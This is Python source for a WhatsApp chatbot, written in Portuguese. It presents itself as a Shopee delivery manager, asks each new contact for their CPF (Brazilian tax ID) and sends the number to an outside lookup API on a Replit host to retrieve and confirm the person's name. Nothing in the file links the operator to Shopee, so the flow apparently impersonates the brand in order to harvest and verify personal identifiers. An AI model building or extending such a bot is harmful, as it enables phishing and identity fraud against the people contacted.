#!/usr/bin/env python3
"""
Sistema de Automação de Conversas
Gerencia fluxos automáticos de resposta baseado no contexto da conversa
"""
import logging
import re
import requests
import json
from typing import Dict, Any, Optional, Tuple
from datetime import datetime, timedelta

class ConversationAutomation:
    """Automação inteligente de conversas WhatsApp"""
    
    def __init__(self, whatsapp_api, db):
        self.whatsapp_api = whatsapp_api
        self.db = db
        
        # Estados de conversação por cliente
        self.conversation_states = {}
        
    def should_trigger_automation(self, phone_number: str, conversation_id: int) -> bool:
        """Verifica se deve disparar automação para esta conversa"""
        try:
            from models import ChatMessage
            
            # Contar mensagens do cliente nesta conversa
            client_messages = ChatMessage.query.filter_by(
                conversation_id=conversation_id,
                direction='inbound'
            ).count()
            
            # Primeira mensagem do cliente = disparar automação
            if client_messages == 1:
                logging.info(f"🤖 PRIMEIRA MENSAGEM detectada de {phone_number} - INICIANDO AUTOMAÇÃO")
                return True
                
            return False
            
        except Exception as e:
            logging.error(f"Erro ao verificar automação: {str(e)}")
            return False
    
    def process_automation(self, phone_number: str, conversation_id: int, message_content: str, phone_number_id: str) -> bool:
        """Processa automação baseada no estado da conversa"""
        try:
            # Normalizar número para estado
            normalized_phone = self._normalize_phone(phone_number)
            current_state = self.conversation_states.get(normalized_phone, 'initial')
            
            logging.info(f"🤖 Processando automação - Estado: {current_state} - Mensagem: {message_content[:50]}")
            
            if current_state == 'initial':
                return self._handle_initial_contact(normalized_phone, conversation_id, phone_number_id)
            elif current_state == 'waiting_cpf':
                return self._handle_cpf_input(normalized_phone, conversation_id, message_content, phone_number_id)
            elif current_state == 'confirming_name':
                return self._handle_name_confirmation(normalized_phone, conversation_id, message_content, phone_number_id)
            
            return False
            
        except Exception as e:
            logging.error(f"Erro na automação: {str(e)}")
            return False
    
    def _handle_initial_contact(self, phone_number: str, conversation_id: int, phone_number_id: str) -> bool:
        """Resposta inicial - apresentar como gerente da Shopee"""
        try:
            message = (
                "👋 Olá! Sou o gerente de entregadores da Shopee.\n\n"
                "📦 Estou aqui para ajudar você a finalizar seu cadastro e resolver questões de entrega.\n\n"
                "🔍 Para prosseguir, preciso validar seus dados.\n"
                "📄 Por favor, digite seu **CPF** (apenas números, sem pontos ou traços):"
            )
            
            # Enviar mensagem
            success, result = self.whatsapp_api.send_text_message(phone_number, message)
            
            if success:
                # Atualizar estado
                self.conversation_states[phone_number] = 'waiting_cpf'
                
                # Salvar mensagem enviada no banco
                self._save_outbound_message(conversation_id, message, result.get('messageId'))
                
                logging.info(f"✅ Mensagem inicial enviada para {phone_number}")
                return True
            else:
                logging.error(f"❌ Falha ao enviar mensagem inicial: {result}")
                return False
                
        except Exception as e:
            logging.error(f"Erro na resposta inicial: {str(e)}")
            return False
    
    def _handle_cpf_input(self, phone_number: str, conversation_id: int, message_content: str, phone_number_id: str) -> bool:
        """Processar CPF digitado pelo usuário"""
        try:
            # Extrair CPF da mensagem
            cpf = self._extract_cpf(message_content)
            
            if not cpf:
                # CPF inválido - pedir novamente
                error_message = (
                    "❌ CPF não reconhecido.\n\n"
                    "📄 Por favor, digite apenas os números do seu CPF (11 dígitos):\n"
                    "Exemplo: 12345678901"
                )
                
                success, result = self.whatsapp_api.send_text_message(phone_number, error_message)
                if success:
                    self._save_outbound_message(conversation_id, error_message, result.get('messageId'))
                
                return True
            
            # CPF válido - enviar mensagem de aguarde
            wait_message = (
                "⏳ Aguarde um momento...\n"
                "🔍 Estou buscando seu cadastro no sistema Shopee..."
            )
            
            success, result = self.whatsapp_api.send_text_message(phone_number, wait_message)
            if success:
                self._save_outbound_message(conversation_id, wait_message, result.get('messageId'))
            
            # Buscar dados na API
            client_data = self._fetch_client_data(cpf)
            
            if client_data and client_data.get('sucesso'):
                # Cliente encontrado - confirmar nome
                cliente = client_data.get('cliente', {})
                nome = cliente.get('nome', 'Nome não informado')
                
                # Salvar dados do cliente no estado
                self.conversation_states[phone_number] = 'confirming_name'
                
                # Criar mensagem de confirmação com botões
                return self._send_name_confirmation(phone_number, conversation_id, nome, phone_number_id)
            else:
                # Cliente não encontrado
                not_found_message = (
                    "❌ CPF não encontrado no sistema Shopee.\n\n"
                    "🤔 Verifique se:\n"
                    "• O CPF está correto\n"
                    "• Você já fez algum pedido na Shopee\n\n"
                    "📄 Tente novamente ou digite seu CPF correto:"
                )
                
                success, result = self.whatsapp_api.send_text_message(phone_number, not_found_message)
                if success:
                    self._save_outbound_message(conversation_id, not_found_message, result.get('messageId'))
                
                return True
                
        except Exception as e:
            logging.error(f"Erro ao processar CPF: {str(e)}")
            return False
    
    def _send_name_confirmation(self, phone_number: str, conversation_id: int, nome: str, phone_number_id: str) -> bool:
        """Enviar confirmação de nome com botões Sim/Não"""
        try:
            # Mensagem de confirmação
            confirmation_message = (
                f"✅ Cadastro encontrado!\n\n"
                f"👤 Nome: **{nome}**\n\n"
                f"🤔 Este é o seu nome correto?"
            )
            
            # Enviar mensagem de texto primeiro
            success, result = self.whatsapp_api.send_text_message(phone_number, confirmation_message)
            if success:
                self._save_outbound_message(conversation_id, confirmation_message, result.get('messageId'))
            
            # Enviar botões de confirmação
            buttons_message = (
                "👆 Confirme se o nome acima está correto:\n\n"
                "1️⃣ SIM - É meu nome\n"
                "2️⃣ NÃO - Nome incorreto\n\n"
                "💬 Digite 1 para SIM ou 2 para NÃO"
            )
            
            success, result = self.whatsapp_api.send_text_message(phone_number, buttons_message)
            if success:
                self._save_outbound_message(conversation_id, buttons_message, result.get('messageId'))
                logging.info(f"✅ Confirmação de nome enviada para {phone_number}: {nome}")
                return True
            
            return False
            
        except Exception as e:
            logging.error(f"Erro ao enviar confirmação: {str(e)}")
            return False
    
    def _handle_name_confirmation(self, phone_number: str, conversation_id: int, message_content: str, phone_number_id: str) -> bool:
        """Processar resposta de confirmação de nome"""
        try:
            content_lower = message_content.lower().strip()
            
            # Detectar resposta
            if content_lower in ['1', 'sim', 'yes', 's']:
                # Nome confirmado
                success_message = (
                    "🎉 Perfeito! Nome confirmado.\n\n"
                    "✅ Seu cadastro está validado no sistema Shopee.\n"
                    "📦 Agora você pode acompanhar suas entregas e finalizar pedidos.\n\n"
                    "❓ Como posso ajudar você hoje?"
                )
                
                # Limpar estado da automação
                if phone_number in self.conversation_states:
                    del self.conversation_states[phone_number]
                
                success, result = self.whatsapp_api.send_text_message(phone_number, success_message)
                if success:
                    self._save_outbound_message(conversation_id, success_message, result.get('messageId'))
                
                return True
                
            elif content_lower in ['2', 'não', 'nao', 'no', 'n']:
                # Nome não confirmado
                error_message = (
                    "❌ Nome não confirmado.\n\n"
                    "🔍 Vamos tentar novamente.\n"
                    "📄 Digite seu CPF correto (apenas números):"
                )
                
                # Voltar ao estado de espera de CPF
                self.conversation_states[phone_number] = 'waiting_cpf'
                
                success, result = self.whatsapp_api.send_text_message(phone_number, error_message)
                if success:
                    self._save_outbound_message(conversation_id, error_message, result.get('messageId'))
                
                return True
            else:
                # Resposta não reconhecida
                help_message = (
                    "🤔 Não entendi sua resposta.\n\n"
                    "Por favor, escolha uma opção:\n"
                    "1️⃣ Digite **1** se o nome está CORRETO\n"
                    "2️⃣ Digite **2** se o nome está INCORRETO"
                )
                
                success, result = self.whatsapp_api.send_text_message(phone_number, help_message)
                if success:
                    self._save_outbound_message(conversation_id, help_message, result.get('messageId'))
                
                return True
                
        except Exception as e:
            logging.error(f"Erro na confirmação de nome: {str(e)}")
            return False
    
    def _extract_cpf(self, message: str) -> Optional[str]:
        """Extrair CPF da mensagem (com ou sem pontuação)"""
        try:
            # Remover tudo que não é número
            numbers_only = re.sub(r'\D', '', message)
            
            # Verificar se tem 11 dígitos
            if len(numbers_only) == 11:
                return numbers_only
            
            return None
            
        except Exception as e:
            logging.error(f"Erro ao extrair CPF: {str(e)}")
            return None
    
    def _fetch_client_data(self, cpf: str) -> Optional[Dict]:
        """Buscar dados do cliente na API externa"""
        try:
            api_url = f"https://recoveryfy.replit.app/api/v1/cliente/cpf/{cpf}"
            
            logging.info(f"🔍 Buscando CPF {cpf} na API: {api_url}")
            
            response = requests.get(api_url, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                logging.info(f"✅ API response: {data}")
                return data
            else:
                logging.warning(f"❌ API retornou status {response.status_code}")
                return None
                
        except Exception as e:
            logging.error(f"Erro ao buscar dados na API: {str(e)}")
            return None
    
    def _save_outbound_message(self, conversation_id: int, content: str, whatsapp_message_id: str = None):
        """Salvar mensagem enviada no banco"""
        try:
            from app import app
            from models import ChatMessage
            
            # Usar contexto da aplicação para evitar conflitos de sessão
            with app.app_context():
                message = ChatMessage.create_outbound(
                    conversation_id=conversation_id,
                    content=content
                )
                
                if whatsapp_message_id:
                    message.update_status('sent', whatsapp_message_id)
            
        except Exception as e:
            logging.error(f"Erro ao salvar mensagem outbound: {str(e)}")
    
    def _normalize_phone(self, phone: str) -> str:
        """Normalizar número de telefone"""
        if not phone:
            return phone
        
        # Remove + e espaços
        phone = phone.replace('+', '').replace(' ', '').replace('-', '')
        
        # Garantir que tem 13 dígitos (55 + 11 dígitos)
        if len(phone) == 11 and not phone.startswith('55'):
            phone = '55' + phone
        
        return phone